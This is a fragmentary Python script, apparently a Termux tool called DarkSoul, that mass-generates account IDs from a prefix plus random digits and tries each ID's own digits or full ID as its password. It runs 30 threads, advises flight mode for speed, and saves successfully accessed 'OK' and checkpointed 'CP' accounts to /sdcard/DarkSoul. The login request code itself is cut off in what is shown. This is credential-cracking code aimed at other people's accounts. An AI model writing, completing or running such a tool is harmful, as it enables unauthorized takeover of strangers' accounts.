...
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛DarkSoul 🙂💗 \x07')

try:os.mkdir('/sdcard/DarkSoul')
except:pass
...
logo= f'''\033[1;92m
  ...
  ____             _      ____              _ 
 |  _ \  __ _ _ __| | __ / ___|  ___  _   _| |
 | | | |/ _` | '__| |/ / \___ \ / _ \| | | | |
 | |_| | (_| | |  |   <   ___) | (_) | |_| | |
 |____/ \__,_|_|  |_|\_\ |____/ \___/ \__,_|_|
                                                                                           
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Lal Muhammad
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://facebook.com/darksoul
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/DarkSoulsS
 \033[1;97m[\033[1;92m•\033[1;97m] Version  : \033[1;92m0.1
 \033[1;97m[\33[1;92m•\033[1;97m] Tool type: \033[1;97mPaid
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92mFor Haters  \033[1;97m: Tumhara poora System Phaad dengy 🤞\033[1;97m]
\033[1;97m----------------------------------------------------
'''
...
def menu():
    ...
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \x1b[38;5;208mCONTACT DEVELOPER")
    print(f" \033[1;97m[\033[1;92m03\033[1;97m] \033[1;32mFOLLOW FACEBOOK")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open https://wa.me/923041544896")
        time.sleep(3)
        menu()
    elif younisxyz in ['3','03']:
    	os.system("xdg-open https://https://www.facebook.com/lb.laghari?mibextid=ZbWKwL");time.sleep(3);menu()
    else:
...
def random_number():
    ...
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        ...
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/DarkSoul')
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = [xyz,uid] 
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[DarkSoul] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
